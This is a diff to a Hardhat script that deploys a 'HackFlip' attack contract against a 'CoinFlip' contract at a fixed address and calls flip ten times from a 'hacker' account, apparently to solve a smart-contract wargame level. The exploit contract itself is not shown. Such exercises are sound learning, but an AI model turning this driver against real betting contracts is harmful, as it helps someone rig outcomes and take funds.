@@ -13,22 +13,44 @@ async function main() {
   // manually to make sure everything is compiled
   // await hre.run('compile');
 
-  // We get the contract to deploy
+  // 👉 Contract name and address
+  const contractName = "CoinFlip";
+  const contractAddress = "0xB570F62E443eE128FF756DDd9E9a3cb4107D48C1";
+
+  // 👿 We get the hack contract to deploy
   const HackFlip = await hre.ethers.getContractFactory("HackFlip");
-  const hackFlip = await HackFlip.deploy();
+  const hackFlip = await HackFlip.deploy(contractAddress);
 
   await hackFlip.deployed();
 
-  console.log("✅ HackFlip deployed to:", hackFlip.address);
+  console.log(`✅ HackFlip deployed to:\n ${hackFlip.address} \n`);
 
-  // Sleep for 15 seconds to allow the contract to be deployed
-  await new Promise((r) => setTimeout(r, 15000));
+  // Sleep for 1 seconds to allow the contract to be deployed
+  await new Promise((r) => setTimeout(r, 1000));
+
+  // Get accounts
+  const [hackerSigner] = await hre.ethers.getSigners();
+  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);
+
+  // Flipping 10 times
+  let i = 0;
+  while (i < 10) {
+    try {
+      let flip = await hackFlip.connect(hackerSigner).flip();
+      flip = await flip.wait((confirms = 1));
+      i++;
+      console.log(`🎲 Flip #${i} executed successfully!`);
+    } catch (e) {}
+  }
 
   // Verify contract deployment
   try {
-    await hre.run("verify:verify", { address: hackFlip.address });
+    await hre.run("verify:verify", {
+      address: hackFlip.address,
+      constructorArguments: [contractAddress],
+    });
   } catch (error) {
-    // console.error("🔴 Error ocurred while verifying. Check manually");
+    console.error("🔴 Error ocurred while verifying. Check manually");
     console.error(error);
   }
 }
